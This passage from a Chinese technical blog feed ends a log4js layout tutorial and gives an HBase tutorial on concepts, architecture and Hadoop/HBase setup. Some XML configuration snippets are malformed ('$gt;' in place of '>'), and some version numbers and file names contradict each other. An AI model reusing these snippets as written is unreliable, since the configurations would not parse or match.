<h2 id="Layout"><a href="#Layout" class="headerlink" title="Layout"></a>Layout</h2><p>Layout 是 log4js 提供的高级功能，通过 layout 我们可以自定义每一条输出日志的格式。log4js 内置了四中类型的格式：</p>
<ol>
<li>messagePassThrough：仅仅输出日志的内容；</li>
<li>basic：在日志的内容前面会加上时间、日志的级别和类别，通常日志的默认 layout；</li>
<li>colored/coloured：在 basic 的基础上给日志加上颜色，appender Console 默认使用的就是这个 layout；</li>
<li>pattern：这是一种特殊类型，可以通过它来定义任何你想要的格式。</li>
</ol>
<p>一个 pattern 的例子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> log4js = <span class="built_in">require</span>(<span class="string">'log4js'</span>);</span><br><span class="line"></span><br><span class="line">log4js.configure(&#123;</span><br><span class="line">  appenders: &#123;</span><br><span class="line">    <span class="built_in">console</span>: &#123; <span class="attr">type</span>: <span class="string">'console'</span>, <span class="attr">layout</span>: &#123; <span class="attr">type</span>: <span class="string">'pattern'</span>, <span class="attr">pattern</span>: <span class="string">'[%r] [%[%5.5p%]] - %m%n'</span> &#125; &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  categories: &#123;</span><br><span class="line">    <span class="keyword">default</span>: &#123; <span class="attr">appenders</span>: [<span class="string">'console'</span>], <span class="attr">level</span>: <span class="string">'info'</span> &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = log4js.getLogger();</span><br><span class="line">logger.info(<span class="string">"Time:"</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br><span class="line">log4js.shutdown(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure></p>
<p>%r %p $m $n 是 log4js 内置的包含说明符，可以借此来输出一些 meta 的信息，更多细节，可以参考 log4js 的文档。</p>
<p>这里，我们总结一下Logger、Appender 和 Layout 的定位。</p>
<ol>
<li>Logger 输出的日志内容</li>
<li>Appender 日志输出到哪</li>
<li>Layout 如何输出日志</li>
</ol>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>一个应用日志配置的例子</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> log4js = <span class="built_in">require</span>(<span class="string">'log4js'</span>);</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">'./index'</span>);</span><br><span class="line"><span class="keyword">const</span> moment = <span class="built_in">require</span>(<span class="string">'moment'</span>);</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"></span><br><span class="line">log4js.addLayout(<span class="string">'json'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">logEvent</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> categoryName = logEvent.categoryName;</span><br><span class="line">    <span class="keyword">const</span> level = logEvent.level &amp;&amp; logEvent.level.levelStr;</span><br><span class="line">    <span class="keyword">const</span> pid = logEvent.pid;</span><br><span class="line">    <span class="keyword">const</span> cluster = logEvent.cluster;</span><br><span class="line">    <span class="keyword">const</span> clusterWorkerId = cluster &amp;&amp; cluster.workerId;</span><br><span class="line">    <span class="keyword">const</span> clusterWorker = cluster &amp;&amp; cluster.worker;</span><br><span class="line">    <span class="keyword">const</span> time = moment().format(<span class="string">'YYYY-MM-DD HH:mm:ss'</span>);</span><br><span class="line">    <span class="keyword">const</span> data = logEvent.data;</span><br><span class="line">    <span class="keyword">let</span> message = util.format(...data);</span><br><span class="line">    message = message.replace(<span class="regexp">/\\"/g</span>, <span class="string">'"'</span>);</span><br><span class="line">    <span class="keyword">const</span> log = &#123; time, categoryName, level, message, pid, clusterWorkerId, clusterWorker &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(log);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logConfig = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  log4js.configure(&#123;</span><br><span class="line">    appenders: &#123;</span><br><span class="line">      <span class="built_in">console</span>: &#123;</span><br><span class="line">        type: <span class="string">'console'</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      file: &#123;</span><br><span class="line">        type: <span class="string">'file'</span>,</span><br><span class="line">        filename: config.logPath + <span class="string">'file.log'</span>,</span><br><span class="line">        pattern: <span class="string">'-yyyy-MM-dd'</span>,</span><br><span class="line">        alwaysIncludePattern: <span class="literal">true</span>,</span><br><span class="line">        layout: &#123;</span><br><span class="line">          type: <span class="string">'json'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    categories: &#123;</span><br><span class="line">      <span class="keyword">default</span>: &#123; <span class="attr">appenders</span>: [<span class="string">'console'</span>], <span class="attr">level</span>: config.logLevel &#125;,</span><br><span class="line">      file: &#123; <span class="attr">appenders</span>: [<span class="string">'file'</span>, <span class="string">'console'</span>], <span class="attr">level</span>: config.logLevel &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    pm2: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = logConfig;</span><br></pre></td></tr></table></figure>
<p>看看我们做了哪些事情：</p>
<ol>
<li>配置了两个appender，一个为console，另一个为file，file输出到一个滚动的文件中；</li>
<li>使用log4js.getLogger(‘file’) 获取一个类别为 file 的 Logger 实例，传递给log4js.connectLogger 中间件，这个中间件收集访问信息，通过这个实例打出。</li>
</ol>
]]></content>
      <categories>
        <category>node.js</category>
      </categories>
      <tags>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>HBase使用基础教程</title>
    <url>/2019/07/16/HBase%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>参考:<br><a href="https://www.yiibai.com/hbase/" target="_blank" rel="noopener">【易百教程】HBase教程</a></p>
<h1 id="hbase简介"><a href="#hbase简介" class="headerlink" title="hbase简介"></a>hbase简介</h1><h2 id="HBase是什么"><a href="#HBase是什么" class="headerlink" title="HBase是什么?"></a>HBase是什么?</h2><p>HBase是建立在Hadoop文件系统之上的分布式面向列的数据库。</p>
<p>HBase是一个数据模型，类似于谷歌的大表设计，可以提供快速随机访问海量结构化数据。它利用了Hadoop的文件系统（HDFS）提供的容错能力。</p>
<p>它是Hadoop的生态系统，提供对数据的随机实时读/写访问，是Hadoop文件系统的一部分。</p>
<p>人们可以直接或通过HBase的存储HDFS数据。使用HBase在HDFS读取消费/随机访问数据。 HBase在Hadoop的文件系统之上，并提供了读写访问。</p>
<a id="more"></a>
<p><img src="https://mfaying.github.io/static/images/hbase/1.jpg" alt></p>
<h2 id="HBase-和-HDFS"><a href="#HBase-和-HDFS" class="headerlink" title="HBase 和 HDFS"></a>HBase 和 HDFS</h2><table>
<thead>
<tr>
<th>HDFS</th>
<th>HBase</th>
</tr>
</thead>
<tbody>
<tr>
<td>HDFS是适于存储大容量文件的分布式文件系统。</td>
<td>HBase是建立在HDFS之上的数据库。</td>
</tr>
<tr>
<td>HDFS不支持快速单独记录查找。</td>
<td>HBase提供在较大的表快速查找</td>
</tr>
<tr>
<td>它提供了高延迟批量处理;没有批处理概念。</td>
<td>它提供了数十亿条记录低延迟访问单个行记录（随机存取）。</td>
</tr>
<tr>
<td>它提供的数据只能顺序访问。</td>
<td>HBase内部使用哈希表和提供随机接入，并且其存储索引，可将在HDFS文件中的数据进行快速查找。</td>
</tr>
</tbody>
</table>
<h2 id="HBase的存储机制"><a href="#HBase的存储机制" class="headerlink" title="HBase的存储机制"></a>HBase的存储机制</h2><p>HBase是一个面向列的数据库，在表中它由行排序。表模式定义只能列族，也就是键值对。一个表有多个列族以及每一个列族可以有任意数量的列。后续列的值连续地存储在磁盘上。表中的每个单元格值都具有时间戳。总之，在一个HBase：</p>
<ol>
<li>表是行的集合。</li>
<li>行是列族的集合。</li>
<li>列族是列的集合。</li>
<li>列是键值对的集合。</li>
</ol>
<p>下面给出的表中是HBase模式的一个例子。<br><img src="https://mfaying.github.io/static/images/hbase/2.jpg" alt></p>
<h2 id="面向列和面向行"><a href="#面向列和面向行" class="headerlink" title="面向列和面向行"></a>面向列和面向行</h2><p>面向列的数据库是存储数据表作为数据列的部分，而不是作为行数据。总之它们拥有列族。<br>行式数据库 | 列式数据库</p>
<ul>
<li>| -<br>它适用于联机事务处理（OLTP）。 | 它适用于在线分析处理（OLAP）。<br>这样的数据库被设计为小数目的行和列。 | 面向列的数据库设计的巨大表。</li>
</ul>
<p>下图显示了列族在面向列的数据库：<br><img src="https://mfaying.github.io/static/images/hbase/3.jpg" alt></p>
<h2 id="HBase-和-RDBMS"><a href="#HBase-和-RDBMS" class="headerlink" title="HBase 和 RDBMS"></a>HBase 和 RDBMS</h2><table>
<thead>
<tr>
<th>HBase</th>
<th>RDBMS</th>
</tr>
</thead>
<tbody>
<tr>
<td>HBase无模式，它不具有固定列模式的概念;仅定义列族。</td>
<td>RDBMS有它的模式，描述表的整体结构的约束。</td>
</tr>
<tr>
<td>它专门创建为宽表。 HBase是横向扩展。</td>
<td>这些都是细而专为小表。很难形成规模。</td>
</tr>
<tr>
<td>没有任何事务存在于HBase。</td>
<td>RDBMS是事务性的。</td>
</tr>
<tr>
<td>它反规范化的数据。</td>
<td>它具有规范化的数据。</td>
</tr>
<tr>
<td>它用于半结构以及结构化数据是非常好的。</td>
<td>用于结构化数据非常好。</td>
</tr>
</tbody>
</table>
<h2 id="HBase的特点"><a href="#HBase的特点" class="headerlink" title="HBase的特点"></a>HBase的特点</h2><ol>
<li>HBase线性可扩展。</li>
<li>它具有自动故障支持。</li>
<li>它提供了一致的读取和写入。</li>
<li>它集成了Hadoop，作为源和目的地。</li>
<li>客户端方便的Java API。</li>
<li>它提供了跨集群数据复制。</li>
</ol>
<h2 id="在哪里可以使用HBase？"><a href="#在哪里可以使用HBase？" class="headerlink" title="在哪里可以使用HBase？"></a>在哪里可以使用HBase？</h2><ol>
<li>Apache HBase曾经是随机，实时的读/写访问大数据。</li>
<li>它承载在集群普通硬件的顶端是非常大的表。</li>
<li>Apache HBase是此前谷歌Bigtable模拟非关系型数据库。 Bigtable对谷歌文件系统操作，同样类似Apache HBase工作在Hadoop HDFS的顶部。</li>
</ol>
<h2 id="HBase的应用"><a href="#HBase的应用" class="headerlink" title="HBase的应用"></a>HBase的应用</h2><ol>
<li>它是用来当有需要写重的应用程序。</li>
<li>HBase使用于当我们需要提供快速随机访问的数据。</li>
<li>很多公司，如Facebook，Twitter，雅虎，和Adobe内部都在使用HBase。</li>
</ol>
<h1 id="HBase架构"><a href="#HBase架构" class="headerlink" title="HBase架构"></a>HBase架构</h1><p>在HBase中，表被分割成区域，并由区域服务器提供服务。区域被列族垂直分为“Stores”。Stores被保存在HDFS文件。下面显示的是HBase的结构。</p>
<p>注意：术语“store”是用于区域来解释存储结构。<br><img src="https://mfaying.github.io/static/images/hbase/4.jpg" alt></p>
<p>HBase有三个主要组成部分：客户端库，主服务器和区域服务器。区域服务器可以按要求添加或删除。</p>
<h2 id="主服务器"><a href="#主服务器" class="headerlink" title="主服务器"></a>主服务器</h2><p>主服务器是:</p>
<ol>
<li>分配区域给区域服务器并在Apache ZooKeeper的帮助下完成这个任务。</li>
<li>处理跨区域的服务器区域的负载均衡。它卸载繁忙的服务器和转移区域较少占用的服务器。</li>
<li>通过判定负载均衡以维护集群的状态。</li>
<li>负责模式变化和其他元数据操作，如创建表和列。</li>
</ol>
<h2 id="区域"><a href="#区域" class="headerlink" title="区域"></a>区域</h2><p>区域只不过是表被拆分，并分布在区域服务器。</p>
<h2 id="区域服务器"><a href="#区域服务器" class="headerlink" title="区域服务器"></a>区域服务器</h2><p>区域服务器拥有区域如下:</p>
<ol>
<li>与客户端进行通信并处理数据相关的操作。</li>
<li>句柄读写的所有地区的请求。</li>
<li>由以下的区域大小的阈值决定的区域的大小。</li>
</ol>
<p>需要深入探讨区域服务器：包含区域和存储，如下图所示：<br><img src="https://mfaying.github.io/static/images/hbase/5.jpg" alt></p>
<p>存储包含内存存储和HFiles。memstore就像一个高速缓存。在这里开始进入了HBase存储。数据被传送并保存在Hfiles作为块并且memstore刷新。</p>
<h2 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h2><ol>
<li>Zookeeper管理是一个开源项目，提供服务，如维护配置信息，命名，提供分布式同步等</li>
<li>Zookeeper代表不同区域的服务器短暂节点。主服务器使用这些节点来发现可用的服务器。</li>
<li>除了可用性，该节点也用于追踪服务器故障或网络分区。</li>
<li>客户端通过与zookeeper区域服务器进行通信。</li>
<li>在模拟和独立模式，HBase由zookeeper来管理。</li>
</ol>
<h1 id="HBase安装"><a href="#HBase安装" class="headerlink" title="HBase安装"></a>HBase安装</h1><p>本章将介绍如何安装HBase和初始配置。</p>
<h2 id="安装前设置"><a href="#安装前设置" class="headerlink" title="安装前设置"></a>安装前设置</h2><p>安装Hadoop在Linux环境下之前，需要建立和使用Linux SSH(安全Shell)。按照下面设立Linux环境提供的步骤。</p>
<h2 id="创建一个用户"><a href="#创建一个用户" class="headerlink" title="创建一个用户"></a>创建一个用户</h2><p>首先，建议从Unix创建一个单独的Hadoop用户，文件系统隔离Hadoop文件系统。按照下面给出创建用户的步骤。</p>
<ol>
<li>开启root使用命令 “su”.</li>
<li>使用root帐户命令创建用户 “useradd username”.</li>
<li>现在，可以使用命令打开一个现有的用户帐户 “su username”</li>
</ol>
<p>打开Linux终端，输入以下命令来创建一个用户<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ su</span><br><span class="line">password:</span><br><span class="line"># useradd hadoop</span><br><span class="line"># passwd hadoop</span><br><span class="line">New passwd:</span><br><span class="line">Retype new passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="SSH设置和密钥生成"><a href="#SSH设置和密钥生成" class="headerlink" title="SSH设置和密钥生成"></a>SSH设置和密钥生成</h2><p>SSH设置需要在集群上执行不同的操作，如启动，停止和分布式守护shell操作。进行身份验证不同的Hadoop用户，需要一种用于Hadoop的用户提供的公钥/私钥对，并用不同的用户共享。</p>
<p>以下的命令被用于生成使用SSH密钥值对。复制公钥从id_rsa.pub为authorized_keys，并提供所有者，读写权限到authorized_keys文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa</span><br><span class="line">$ cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">$ chmod 0600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<h2 id="验证ssh"><a href="#验证ssh" class="headerlink" title="验证ssh"></a>验证ssh</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh localhost</span><br></pre></td></tr></table></figure>
<h2 id="安装java"><a href="#安装java" class="headerlink" title="安装java"></a>安装java</h2><p>略</p>
<h2 id="下载Hadoop"><a href="#下载Hadoop" class="headerlink" title="下载Hadoop"></a>下载Hadoop</h2><p>安装Java之后，接下来就是安装Hadoop。首先使用“Hadoop version” 命令验证 Hadoop 是否存在，如下所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop version</span><br></pre></td></tr></table></figure></p>
<p>如果一切正常，它会得到下面的输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hadoop 2.6.0</span><br><span class="line">Compiled by jenkins on 2014-11-13T21:10Z</span><br><span class="line">Compiled with protoc 2.5.0</span><br><span class="line">From source with checksum 18e43357c8f927c0695f1e9522859d6a</span><br><span class="line">This command was run using</span><br><span class="line">/home/hadoop/hadoop/share/hadoop/common/hadoop-common-2.6.0.jar</span><br></pre></td></tr></table></figure></p>
<p>如果系统上是无法找到 Hadoop，那么证明还未安装，现在下载Hadoop在您的系统上。按照下面给出的命令。从Apache软件基金会下载并使用下面的命令提取 Hadoop-2.6.0。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ su</span><br><span class="line">password:</span><br><span class="line"># cd /usr/local</span><br><span class="line"># wget http://mirrors.advancedhosters.com/apache/hadoop/common/hadoop-</span><br><span class="line">2.6.0/hadoop-2.6.0-src.tar.gz</span><br><span class="line"># tar xzf hadoop-2.6.0-src.tar.gz</span><br><span class="line"># mv hadoop-2.6.0/* hadoop/</span><br><span class="line"># exit</span><br></pre></td></tr></table></figure></p>
<h2 id="安装-Hadoop"><a href="#安装-Hadoop" class="headerlink" title="安装 Hadoop"></a>安装 Hadoop</h2><p>可在任何需要的方式安装Hadoop。在这里将展示 HBase 模拟分布式模式功能，因此模拟分布式模式的Hadoop安装。</p>
<p>按下面的步骤来安装 Hadoop 2.4.1.</p>
<h2 id="第1步-设置Hadoop"><a href="#第1步-设置Hadoop" class="headerlink" title="第1步 - 设置Hadoop"></a>第1步 - 设置Hadoop</h2><p>可以通过附加下面的命令在 〜/ .bashrc文件中以设置 Hadoop 环境变量。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export HADOOP_HOME=/usr/local/hadoop</span><br><span class="line">export HADOOP_MAPRED_HOME=$HADOOP_HOME</span><br><span class="line">export HADOOP_COMMON_HOME=$HADOOP_HOME</span><br><span class="line">export HADOOP_HDFS_HOME=$HADOOP_HOME</span><br><span class="line">export YARN_HOME=$HADOOP_HOME</span><br><span class="line">export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</span><br><span class="line">export HADOOP_INSTALL=$HADOOP_HOME</span><br></pre></td></tr></table></figure></p>
<p>现在，应用所有更改到当前正在运行的系统。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ source ~/.bashrc</span><br></pre></td></tr></table></figure></p>
<h2 id="第2步-Hadoop配置"><a href="#第2步-Hadoop配置" class="headerlink" title="第2步 - Hadoop配置"></a>第2步 - Hadoop配置</h2><p>找到位于 “$HADOOP_HOME/etc/hadoop” 目录下所有的Hadoop配置文件。根据需要Hadoop将配置文件中的内容作修改。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd $HADOOP_HOME/etc/hadoop</span><br></pre></td></tr></table></figure></p>
<p>为了使用Java开发Hadoop程序，必须用java在系统中的位置来替换 hadoop-env.sh文件中的 java环境变量JAVA_HOME的值。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=/usr/local/jdk1.7.0_71</span><br></pre></td></tr></table></figure></p>
<p>编辑core-site.xml文件来配置Hadoop。<br>core-site.xml文件中包含，如：用于Hadoop实例的端口号，分配给文件系统，存储器限制用于存储数据存储器和读/写缓冲器的大小的信息。<br>打开core-site.xml，并在configuration和configuration标签之间添加以下属性。<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.default.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>hdfs-site.xml<br>hdfs-site.xml文件中包含，如：复制数据的值，NameNode的路径，本地文件系统，要存储Hadoop基础架构的Datanode路径的信息。<br>假设有以下数据。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dfs.replication (data replication value) = 1</span><br><span class="line">(In the below given path /hadoop/ is the user name.</span><br><span class="line">hadoopinfra/hdfs/namenode is the directory created by hdfs file system.)</span><br><span class="line">namenode path = //home/hadoop/hadoopinfra/hdfs/namenode</span><br><span class="line">(hadoopinfra/hdfs/datanode is the directory created by hdfs file</span><br><span class="line">system.)</span><br><span class="line">datanode path = //home/hadoop/hadoopinfra/hdfs/datanode</span><br></pre></td></tr></table></figure></p>
<p>打开这个文件，并在configuration和configuration标记之间添加以下属性。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration$gt;</span></span></span><br><span class="line">&lt;property$gt;</span><br><span class="line"> &lt;name$gt;dfs.replication&lt;/name $gt;</span><br><span class="line"> &lt;value$gt;1&lt;/value$gt;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">property$gt;</span></span></span><br><span class="line"> &lt;property$gt;</span><br><span class="line"> &lt;name$gt;dfs.name.dir&lt;/name$gt;</span><br><span class="line"> &lt;value$gt;file:///home/hadoop/hadoopinfra/hdfs/namenode&lt;/value$gt;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">property$gt;</span></span></span><br><span class="line"> &lt;property$gt;</span><br><span class="line"> &lt;name$gt;dfs.data.dir&lt;/name$gt;</span><br><span class="line"> &lt;value$gt;file:///home/hadoop/hadoopinfra/hdfs/datanode&lt;/value$gt;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">property$gt;</span></span></span><br><span class="line">&lt;/configuration$gt;</span><br></pre></td></tr></table></figure></p>
<p>注：上面的文件，所有的属性值是用户定义的，可以根据自己的Hadoop的基础架构进行更改。</p>
<p>yarn-site.xml</p>
<p>此文件用于配置成yarn在Hadoop中。打开yarn-site.xml文件，并在configuration标签之前添加以下属性到这个文件中。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration$gt;</span></span></span><br><span class="line">&lt;property$gt;</span><br><span class="line"> &lt;name$gt;yarn.nodemanager.aux-services&lt;/name$gt;</span><br><span class="line"> &lt;value$gt;mapreduce_shuffle&lt;/value$gt;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">property$gt;</span></span></span><br><span class="line">&lt;/configuration$gt;</span><br></pre></td></tr></table></figure></p>
<p>mapred-site.xml</p>
<p>此文件用于指定MapReduce框架以使用。默认情况下Hadoop包含yarn-site.xml模板。首先，它需要从mapred-site.xml复制模板到mapred-site.xml文件，使用下面的命令来。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cp mapred-site.xml.template mapred-site.xml</span><br></pre></td></tr></table></figure></p>
<p>打开 mapred-site.xml 文件，并在configuration和configuration标签之间添加以下属性。<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="验证Hadoop安装"><a href="#验证Hadoop安装" class="headerlink" title="验证Hadoop安装"></a>验证Hadoop安装</h2><p>下面的步骤是用来验证Hadoop的安装。</p>
<h2 id="第1步-名称节点设置"><a href="#第1步-名称节点设置" class="headerlink" title="第1步 - 名称节点设置"></a>第1步 - 名称节点设置</h2><p>设置名称节点使用“hdfs namenode -format”命令如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd ~</span><br><span class="line">$ hdfs namenode -format</span><br></pre></td></tr></table></figure></p>
<p>预期的结果如下。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10/24/14 21:30:55 INFO namenode.NameNode: STARTUP_MSG:</span><br><span class="line">/************************************************************</span><br><span class="line">STARTUP_MSG: Starting NameNode</span><br><span class="line">STARTUP_MSG: host = localhost/192.168.1.11</span><br><span class="line">STARTUP_MSG: args = [-format]</span><br><span class="line">STARTUP_MSG: version = 2.4.1</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">10/24/14 21:30:56 INFO common.Storage: Storage directory</span><br><span class="line">/home/hadoop/hadoopinfra/hdfs/namenode has been successfully formatted.</span><br><span class="line">10/24/14 21:30:56 INFO namenode.NNStorageRetentionManager: Going to</span><br><span class="line">retain 1 images with txid &gt;= 0</span><br><span class="line">10/24/14 21:30:56 INFO util.ExitUtil: Exiting with status 0</span><br><span class="line">10/24/14 21:30:56 INFO namenode.NameNode: SHUTDOWN_MSG:</span><br><span class="line">/************************************************************</span><br><span class="line">SHUTDOWN_MSG: Shutting down NameNode at localhost/192.168.1.11</span><br><span class="line">************************************************************</span><br></pre></td></tr></table></figure></p>
<h2 id="第2步-验证Hadoop-DFS"><a href="#第2步-验证Hadoop-DFS" class="headerlink" title="第2步 - 验证Hadoop DFS"></a>第2步 - 验证Hadoop DFS</h2><p>下面的命令用来启动DFS。执行这个命令将启动Hadoop文件系统。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ start-dfs.sh</span><br></pre></td></tr></table></figure></p>
<p>预期的结果如下。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10/24/14 21:37:56</span><br><span class="line">Starting namenodes on [localhost]</span><br><span class="line">localhost: starting namenode, logging to /home/hadoop/hadoop-</span><br><span class="line">2.4.1/logs/hadoop-hadoop-namenode-localhost.out</span><br><span class="line">localhost: starting datanode, logging to /home/hadoop/hadoop-</span><br><span class="line">2.4.1/logs/hadoop-hadoop-datanode-localhost.out</span><br><span class="line">Starting secondary namenodes [0.0.0.0]</span><br></pre></td></tr></table></figure></p>
<h2 id="第3步-验证Yarn脚本"><a href="#第3步-验证Yarn脚本" class="headerlink" title="第3步  - 验证Yarn脚本"></a>第3步  - 验证Yarn脚本</h2><p>下面的命令用来启动yarn脚本。执行此命令将启动yarn守护进程。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ start-yarn.sh</span><br></pre></td></tr></table></figure></p>
<p>预期的结果如下。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">starting yarn daemons</span><br><span class="line">starting resourcemanager, logging to /home/hadoop/hadoop-</span><br><span class="line">2.4.1/logs/yarn-hadoop-resourcemanager-localhost.out</span><br><span class="line">localhost: starting nodemanager, logging to /home/hadoop/hadoop-</span><br><span class="line">2.4.1/logs/yarn-hadoop-nodemanager-localhost.out</span><br></pre></td></tr></table></figure></p>
<h2 id="第4步-访问Hadoop上的浏览器"><a href="#第4步-访问Hadoop上的浏览器" class="headerlink" title="第4步 - 访问Hadoop上的浏览器"></a>第4步 - 访问Hadoop上的浏览器</h2><p>访问Hadoop的默认端口号为50070。使用以下网址，以获取Hadoop服务在浏览器中。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:50070</span><br></pre></td></tr></table></figure></p>
<h2 id="第5步-验证集群中的所有应用程序"><a href="#第5步-验证集群中的所有应用程序" class="headerlink" title="第5步 - 验证集群中的所有应用程序"></a>第5步 - 验证集群中的所有应用程序</h2><p>访问群集的所有应用程序的默认端口号为8088。使用以下URL访问该服务。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:8088/</span><br></pre></td></tr></table></figure></p>
<h2 id="HBase安装-1"><a href="#HBase安装-1" class="headerlink" title="HBase安装"></a>HBase安装</h2><p>单机模式，模拟分布式模式，以及全分布式模式：可以在任何的三种模式来安装HBase。</p>
<h2 id="在单机模式下安装HBase"><a href="#在单机模式下安装HBase" class="headerlink" title="在单机模式下安装HBase"></a>在单机模式下安装HBase</h2><p>使用 “wget” 命令下载HBase，下载网址为：<a href="http://www.interiordsgn.com/apache/hbase/stable/" target="_blank" rel="noopener">http://www.interiordsgn.com/apache/hbase/stable/</a> ，选择最新的稳定版本，并使用 tar “zxvf” 命令将其解压缩。请参见下面的命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cd usr/local/</span><br><span class="line">$wget http://www.interior-dsgn.com/apache/hbase/stable/hbase-0.98.8-</span><br><span class="line">hadoop2-bin.tar.gz</span><br><span class="line">$tar -zxvf hbase-0.98.8-hadoop2-bin.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>切换到超级用户模式，将HBase文件复制到/usr/local，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$su</span><br><span class="line">$password: enter your password here</span><br><span class="line">mv hbase-0.99.1/* Hbase/</span><br></pre></td></tr></table></figure></p>
<h2 id="在单机模式下配置HBase"><a href="#在单机模式下配置HBase" class="headerlink" title="在单机模式下配置HBase"></a>在单机模式下配置HBase</h2><p>在继续HBase之前，需要编辑下列文件和配置HBase。</p>
<p>hbase-env.sh</p>
<p>为HBase设置Java目录，并从conf文件夹打开hbase-env.sh文件。编辑JAVA_HOME环境变量，改变路径到当前JAVA_HOME变量，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/local/Hbase/conf</span><br><span class="line">gedit hbase-env.sh</span><br></pre></td></tr></table></figure></p>
<p>这将打开HBase的env.sh文件。现在使用当前值替换现有JAVA_HOME值，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=/usr/lib/jvm/java-1.7.0</span><br></pre></td></tr></table></figure></p>
